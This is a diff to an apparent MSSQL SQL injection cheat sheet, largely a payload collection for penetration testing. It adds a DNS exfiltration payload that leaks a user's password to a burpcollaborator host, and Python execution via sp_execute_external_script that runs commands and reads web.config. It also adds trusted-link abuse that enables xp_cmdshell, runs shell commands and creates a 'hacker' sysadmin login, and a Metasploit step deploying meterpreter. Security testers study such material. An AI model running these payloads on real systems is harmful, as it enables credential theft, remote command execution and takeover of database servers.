@@ -15,14 +15,23 @@
 * [MSSQL Time Based](#mssql-time-based)
 * [MSSQL Stacked query](#mssql-stacked-query)
 * [MSSQL Command execution](#mssql-command-execution)
-* [MSSQL UNC path](#mssql-unc-path)
+* [MSSQL Out of band](#mssql-out-of-band)
+    * [MSSQL DNS exfiltration](#mssql-dns-exfiltration)
+    * [MSSQL UNC path](#mssql-unc-path)
 * [MSSQL Make user DBA](#mssql-make-user-dba-db-admin)
+* [MSSQL Trusted Links](#mssql-trusted-links)
 
 ## MSSQL comments
 
 ```sql
 -- comment goes here
 /* comment goes here */
+```
+
+## MSSQL User
+
+```sql
+SELECT CURRENT_USER
 ```
 
 ## MSSQL version
@@ -127,7 +136,7 @@ ProductID=1';waitfor delay '0:0:10'--
 ProductID=1');waitfor delay '0:0:10'--
 ProductID=1));waitfor delay '0:0:10'--
 
-IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'                              comment:   --
+IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'     comment:   --
 ```
 
 ## MSSQL Stacked Query
@@ -162,7 +171,36 @@ sqsh -S 192.168.1.X -U sa -P superPassword
 python mssqlclient.py WORKGROUP/Administrator:password@192.168.1X -port 46758
 ```
 
-## MSSQL UNC Path
+Execute Python script 
+
+> Executed by a different user than the one using xp_cmdshell to execute commands
+
+```powershell
+#Print the user being used (and execute commands)
+EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
+EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
+#Open and read a file
+EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'
+#Multiline
+EXECUTE sp_execute_external_script @language = N'Python', @script = N'
+import sys
+print(sys.version)
+'
+GO
+```
+
+## MSSQL Out of band
+
+### MSSQL DNS exfiltration
+
+Technique from https://twitter.com/ptswarm/status/1313476695295512578/photo/1
+
+```powershell
+1 and exists(select * from fn_trace_gettable('\\'%2b(select pass frop users where id=1)%2b'.xxxxxxx.burpcollaborator.net\1.trc',default))
+```
+
+
+### MSSQL UNC Path
 
 MSSQL supports stacked queries so we can create a variable pointing to our IP address then use the `xp_dirtree` function to list the files in our SMB share and grab the NTLMv2 hash.
 
@@ -176,8 +214,41 @@ MSSQL supports stacked queries so we can create a variable pointing to our IP ad
 EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;
 ```
 
+## MSSQL Trusted Links
+
+> The links between databases work even across forest trusts.
+
+```powershell
+msf> use exploit/windows/mssql/mssql_linkcrawler
+[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter sessio
+```
+
+Manual exploitation
+
+```sql
+-- find link
+select * from master..sysservers
+
+-- execute query through the link
+select * from openquery("dcorp-sql1", 'select * from master..sysservers')
+select version from openquery("linkedserver", 'select @@version as version');
+
+-- chain multiple openquery
+select version from openquery("link1",'select version from openquery("link2","select @@version as version")')
+
+-- execute shell commands
+EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer
+select 1 from openquery("linkedserver",'select 1;exec master..xp_cmdshell "dir c:"')
+
+-- create user and give admin privileges
+EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
+EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
+```
+
 ## References
 
 * [Pentest Monkey - mssql-sql-injection-cheat-sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
-* [Sqlinjectionwiki - MSSQL](http://www.sqlinjectionwiki.com/categories/1/mssql-sql-injection-cheat-sheet/)
 * [Error Based - SQL Injection ](https://github.com/incredibleindishell/exploit-code-by-me/blob/master/MSSQL%20Error-Based%20SQL%20Injection%20Order%20by%20clause/Error%20based%20SQL%20Injection%20in%20“Order%20By”%20clause%20(MSSQL).pdf)
+* [MSSQL Trusted Links - HackTricks.xyz](https://book.hacktricks.xyz/windows/active-directory-methodology/mssql-trusted-links)
+* [SQL Server – Link… Link… Link… and Shell: How to Hack Database Links in SQL Server! - Antti Rantasaari - June 6th, 2013](https://blog.netspi.com/how-to-hack-database-links-in-sql-server/)
+* [DAFT: Database Audit Framework & Toolkit - NetSPI](https://github.com/NetSPI/DAFT)
